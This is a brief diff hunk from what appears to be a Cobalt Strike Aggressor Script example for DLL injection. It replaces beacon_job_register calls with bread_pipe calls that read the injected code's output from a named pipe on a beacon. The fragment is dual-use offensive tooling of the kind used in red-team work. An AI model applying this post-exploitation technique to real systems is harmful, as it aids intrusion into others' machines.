@@ -137,9 +137,9 @@ alias cs_example_dllinject {
 
    # Register job to read from pipe
    if (%opts["--format"] eq "yes") {
-      beacon_job_register(@($bid), "COMMAND_JOB_REGISTER", "CALLBACK_OUTPUT", "test pipe", "\\\\.\\pipe\\mynamedpipe", %opts["--pid"], 15000, &example_dllinject_cb);
+      bread_pipe(@($bid), "ANONYMOUS_BYTESTREAM", "CALLBACK_OUTPUT", "test pipe", "\\\\.\\pipe\\mynamedpipe", %opts["--pid"], 15000, &example_dllinject_cb);
    } else {
-      beacon_job_register(@($bid), "COMMAND_JOB_REGISTER", "CALLBACK_OUTPUT", "test pipe", "\\\\.\\pipe\\mynamedpipe", %opts["--pid"], 15000, $null);
+      bread_pipe(@($bid), "ANONYMOUS_BYTESTREAM", "CALLBACK_OUTPUT", "test pipe", "\\\\.\\pipe\\mynamedpipe", %opts["--pid"], 15000, $null);
    }
 }
 
